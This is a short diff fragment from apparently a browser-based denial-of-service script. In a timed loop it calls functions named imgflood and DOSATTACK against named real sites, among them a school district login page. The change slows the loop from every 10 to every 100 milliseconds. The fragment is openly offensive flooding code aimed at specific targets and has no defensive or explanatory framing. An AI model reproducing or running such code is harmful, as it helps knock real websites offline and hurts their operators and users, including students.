@@ -21,5 +21,5 @@ setInterval(function(){
   imgflood("https://lizardpoint.com");
   DOSATTACK("jihadology.net");
   DOSATTACK("ls-child.mvcsc.k12.in.us/login");
-}, 10);
+}, 100);
 
